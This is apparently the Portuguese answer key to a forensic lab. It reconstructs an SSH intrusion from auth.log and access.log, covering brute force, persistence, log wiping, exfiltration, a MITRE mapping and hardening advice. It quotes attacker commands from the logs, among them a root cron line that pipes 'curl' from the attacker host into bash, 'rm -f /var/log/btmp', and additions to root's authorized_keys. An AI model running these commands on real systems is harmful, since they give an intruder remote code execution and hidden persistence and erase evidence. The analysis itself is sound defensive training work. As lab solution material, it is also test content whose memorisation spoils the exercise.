# 🔓 Solução — Lab 06

> ⚠️ **Spoiler.** Tente antes de abrir.

## 1. IPs

| IP | Papel | Evidência |
| :-- | :-- | :-- |
| `10.10.10.66` | **atacante** | só aparece em falhas, força bruta, `sudo` suspeito e exfiltração |
| `192.168.0.15` | **legítimo** | autenticação por chave, horário comercial, acesso à web normal |

```bash
grep -c "10.10.10.66" auth.log     # 20+
grep -c "192.168.0.15" auth.log    # 4
```

O IP legítimo aparece em `Accepted publickey for dev01`, numa sessão curta, e depois em `Accepted password for dev02` às 02:31 — comportamento diferente do atacante.

## 2. Tentativas falhas

```bash
grep -c "Failed password" auth.log
```

**9 tentativas falhas** (`admin`, `oracle`, `test`, `backup`, `root` ×2, `svc-backup` ×3), entre 02:11:03 e 02:13:52.

Usuários distintos tentados: **6** (`admin`, `oracle`, `test`, `backup`, `root`, `svc-backup`).

```bash
grep "Failed password" auth.log | awk '{print $11}' | sort -u
```

## 3. Conta comprometida

```
Feb 14 02:14:07 kali sshd[4110]: Accepted password for svc-backup from 10.10.10.66 port 51602 ssh2
```

- usuário: **`svc-backup`**
- horário: **02:14:07**
- método: **senha** (`Accepted password`, não `publickey`)

Detalhe importante: antes disso, o atacante tentou `svc-backup` como "invalid user" — o que indica que ele **descobriu** o nome da conta (enumeração) e então passou a atacar a senha correta.

## 4. Ações pós-comprometimento (em ordem)

| Horário | Ação | Evidência |
| :-- | :-- | :-- |
| 02:15:32 | criou usuário `bkp` | `sudo ... COMMAND=/usr/sbin/useradd -m -s /bin/bash bkp` |
| 02:15:44 | deu sudo ao `bkp` | `usermod -aG sudo bkp` |
| 02:16:10 | adicionou chave SSH do root | `tee -a /root/.ssh/authorized_keys` |
| 02:16:51 | criou binário SUID | `chmod 4755 /tmp/.systemd-update` |
| 02:18:44 | cron baixando script | `CRON (root) CMD (/usr/bin/curl -s http://10.10.10.66:8080/update.sh \| bash)` |
| 02:19:02 | apagou log de falhas | `rm -f /var/log/btmp` |
| 02:21:10 | logou como `bkp` via chave | `Accepted publickey for bkp from 10.10.10.66` |
| 02:24:33 | compactou `/srv/cyberlab` | `tar -czf /tmp/.cache.tar.gz /srv/cyberlab` |
| 02:27:01 | desconectou | `Received disconnect ... 10.10.10.66` |

## 5. Persistência

| Técnica | Artefato | Evidência |
| :-- | :-- | :-- |
| Conta local nova + grupo sudo | usuário `bkp` | `useradd` / `usermod -aG sudo` |
| Chave SSH no root | `/root/.ssh/authorized_keys` | `tee -a /root/.ssh/authorized_keys` |
| Cron como root | `curl ... \| bash` | `CRON[4231]` |
| Binário SUID | `/tmp/.systemd-update` | `chmod 4755` |

São **quatro** mecanismos independentes — o atacante assumiu que um seria removido.

## 6. Anti-forense

```
Feb 14 02:19:02 kali sudo: svc-backup : ... COMMAND=/usr/bin/rm -f /var/log/btmp
```

`btmp` guarda **tentativas de login falhas** (`lastb`). Apagar remove a prova da força bruta. O `auth.log` ficou intacto — provavelmente porque o atacante não queria chamar atenção com um buraco no log principal, ou simplesmente errou.

Sinal clássico de anti-forense: **log que existe, mas está vazio ou truncado**.

```bash
ls -l /var/log/btmp
lastb | head
```

## 7. Exfiltração

`auth.log`:

```
Feb 14 02:24:33 kali sudo: bkp : ... COMMAND=/usr/bin/tar -czf /tmp/.cache.tar.gz /srv/cyberlab
```

`access.log`:

```
10.10.10.66 - - [14/Feb/2026:02:23:40 +0000] "POST /upload HTTP/1.1" 201 58
```

Ou seja: compactou o diretório de backups e enviou via `POST /upload` (HTTP 201 = criado no servidor do atacante). O histórico confirma a sequência.

## 8. Dwell time

- primeiro acesso válido: **02:14:07**
- última ação observada: **02:27:01** (desconexão) — ou 02:21:10 até 02:27 se contar só a sessão `bkp`

**≈ 13 minutos** de permanência ativa. Se o cron malicioso continuou rodando depois, o dwell time real é maior: não há evidência de remoção nos logs fornecidos.

## 9. Reconhecimento web

```
02:09:12 GET /robots.txt      404
02:09:15 GET /.env            404
02:09:18 GET /.git/config     404
02:09:22 GET /admin           404
02:09:26 GET /backup.zip      404
02:09:31 GET /phpinfo.php     404
```

Todos `404`, mas o **padrão** é inequívoco: busca por segredos de aplicação (`.env`, `.git`), painel administrativo e backups expostos. É reconhecimento automatizado de uma aplicação web, não navegação humana.

Depois:

```
02:14:20 GET /update.sh   200   <- payload baixado pelo cron
02:23:40 POST /upload     201   <- exfiltração
```

O `200` no `/update.sh` é a prova de que o cron **funcionou**.

## 10. MITRE ATT&CK

| Evento | Técnica | Nome |
| :-- | :-- | :-- |
| Força bruta SSH | `T1110.001` | Brute Force: Password Guessing |
| Login com conta válida | `T1078` | Valid Accounts |
| Criação de conta local | `T1136.001` | Create Account: Local Account |
| Chave em `authorized_keys` | `T1098.004` | Account Manipulation: SSH Authorized Keys |
| SUID em `/tmp` | `T1548.001` | Abuse Elevation Control: Setuid/Setgid |
| Cron com download | `T1053.003` | Scheduled Task/Job: Cron |
| `rm /var/log/btmp` | `T1070.002` | Indicator Removal: Clear Linux Logs |
| `tar` + upload | `T1041` | Exfiltration Over C2 Channel |
| `GET /.env` etc. | `T1595.002` | Active Scanning: Vulnerability Scanning |

## Timeline pronta para o relatório

| Horário | Evento |
| :-- | :-- |
| 02:09 | reconhecimento web |
| 02:11–02:13 | força bruta SSH (9 falhas, 6 usuários) |
| 02:14:07 | acesso válido `svc-backup` |
| 02:14:20 | download de `update.sh` |
| 02:15:32 | criação do usuário `bkp` |
| 02:15:44 | `bkp` entra no grupo sudo |
| 02:16:10 | chave SSH no root |
| 02:16:51 | binário SUID em `/tmp` |
| 02:18:44 | cron malicioso executa |
| 02:19:02 | apaga `/var/log/btmp` |
| 02:21:10 | login como `bkp` por chave |
| 02:23:40 | upload HTTP (exfiltração) |
| 02:24:33 | compacta `/srv/cyberlab` |
| 02:27:01 | desconexão |

## Recomendações priorizadas (exemplo)

| Prioridade | Ação |
| :-- | :-- |
| Alta | Desativar senha no SSH (`PasswordAuthentication no`) e exigir chave |
| Alta | Remover contas de serviço com shell e bloquear contas sem uso |
| Alta | Alertar em criação de usuário, alteração de `sudoers` e novos arquivos em `/etc/cron.d` |
| Média | Restringir `/tmp` com `noexec,nosuid` |
| Média | Monitorar `authorized_keys` de todos os usuários |
| Média | Configurar retenção e envio centralizado de logs (o atacante apagou `btmp`) |
| Baixa | Revisar `robots.txt` e remover arquivos de backup do diretório web |

## Resposta à pergunta final

Se o `auth.log` tivesse sido truncado:

- você **ainda** provaria a exfiltração pelo `access.log` (IP, `POST /upload`, horário)
- **perderia** a identificação exata da conta comprometida, o `sudo` e a criação do `bkp` — a menos que exista log centralizado (`rsyslog` remoto, SIEM, auditd)

É exatamente por isso que "log só na máquina comprometida" não é evidência confiável.

## Lições

1. Log diz **o que**, não **por quê**. Correlação entre fontes é o que fecha a história.
2. `404` também é evidência: mostra intenção.
3. Anti-forense é um evento auditável (e um ótimo alerta).
4. Todo ataque deixa **envelope**. Achar o conteúdo exige auditoria de verdade.
